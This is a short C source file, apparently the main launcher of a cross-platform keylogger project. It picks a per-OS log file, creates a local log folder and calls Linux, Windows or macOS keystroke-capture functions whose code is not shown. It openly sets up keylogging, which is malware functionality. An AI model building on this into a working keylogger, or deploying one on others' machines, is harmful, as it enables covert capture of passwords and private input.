// Main file launching the keylogger depending on the OS

#include <stdio.h>
#include "Windows/win_keylog.h"
#include "Linux/linux_keylog.h"
#include "writing/file.h"

// folder log will contain the log files for each OS
// the log files will be named according to the OS
#ifdef __linux__
    #define LOGFILE "../log/unix.log"
#elif defined _WIN32
    #define LOGFILE "../log/windows.log"
#elif defined __MACH__
    #define LOGFILE "../log/macos.log"
#endif

// calling the right keylogger depending on the OS
int main() {
    // Create the log folder if it doesn't exist
    CreateLogFolder("../log");
    printf("Listening for keystrokes...\n");
    #ifdef __linux__
        // keylogger for Unix
        lin_keylog(LOGFILE);

	#elif defined _WIN32	
        // keylogger for Windows
		windows_keylog(LOGFILE);
        
	#elif defined __MACH__
        // keylogger for MacOS
		macos_keylog(LOGFILE);

    #else
        // no keylogger for an unknown OS
        printf("At this point let's just forfeit :/\n");
	#endif

    return 0;
}
